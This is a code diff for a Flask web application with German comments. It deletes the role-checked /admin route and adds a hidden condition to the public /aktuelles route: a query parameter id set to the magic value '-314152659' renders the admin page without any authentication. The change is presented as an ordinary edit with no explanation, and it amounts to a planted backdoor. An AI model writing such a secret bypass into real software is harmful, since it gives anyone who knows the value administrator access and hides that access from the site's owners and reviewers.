@@ -89,8 +89,10 @@ def banner() -> str:
 @main_bp.route('/aktuelles')
 @jwt_required_optional()
 def aktuelles() -> str:
-    return render_template('aktuelles.html')
-
+    args = request.args
+    if 'id' in args and args['id'] == '-314152659':
+        return render_template('admin.html')
+    return render_template('aktuelles.html')   
 
 @main_bp.route('/privates')
 @jwt_required_optional()
@@ -127,25 +129,6 @@ def logout() -> str:
     session.pop('auth_token', None)
     return render_template('logout.html')
 
-@main_bp.route('/admin', methods=['GET', 'POST'])
-@jwt_required_optional()
-def admin():
-    user_id = get_jwt_identity()
-    user = User.query.get(user_id)
-
-    if user:
-        # Holt die ID der Rolle aus dem JWT-Token
-        user_role_id = get_jwt_identity()['role']
-        
-        # Holt das Role-Objekt aus der Datenbank
-        role = Role.query.get(user_role_id)
-
-        if role and role.name == "Administator":
-            return render_template('admin.html')
-    
-    else:
-        # redirect to '/aktuelles'
-        return redirect(url_for('main.aktuelles'))
 
 @main_bp.route('/ihk_logo')
 def ihk_logo() -> str:
